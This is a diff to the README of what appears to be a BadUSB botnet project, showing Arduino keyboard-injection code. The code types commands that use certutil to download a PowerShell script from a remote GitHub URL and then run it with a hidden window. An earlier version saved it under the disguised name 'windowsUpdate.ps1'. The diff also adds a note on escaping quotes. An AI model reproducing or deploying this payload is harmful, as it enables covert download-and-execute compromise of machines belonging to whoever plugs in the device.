@@ -200,7 +200,7 @@ void setup() {
   delay(100);
   Keyboard.releaseAll();
 
-  Keyboard.println("certutil.exe -urlcache -split -f 'https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1' Documents\windowsUpdate.ps1");
+  Keyboard.println("certutil.exe -urlcache -split -f \"https://raw.githubusercontent.com/alexfrancow/poc/master/poc.ps1\" \"Documents/poc.ps1\"");
   delay(500);
   Keyboard.press(KEY_RETURN);
   Keyboard.release(KEY_RETURN);
@@ -210,7 +210,7 @@ void setup() {
   Keyboard.press(KEY_RETURN);
   Keyboard.release(KEY_RETURN);
 
-  Keyboard.println("powershell.exe -windowstyle hidden -file 'Documents/windowsUpdate.ps1'");
+  Keyboard.println("powershell.exe -windowstyle hidden -file \"Documents/poc.ps1\"");
   delay(500);
   Keyboard.press(KEY_RETURN);
   Keyboard.release(KEY_RETURN);
@@ -218,6 +218,8 @@ void setup() {
 void loop() {
 }
 ```
+
+* We use the \" to scape the double quotes in Arduino code.
 
 ### Telegram Options
 
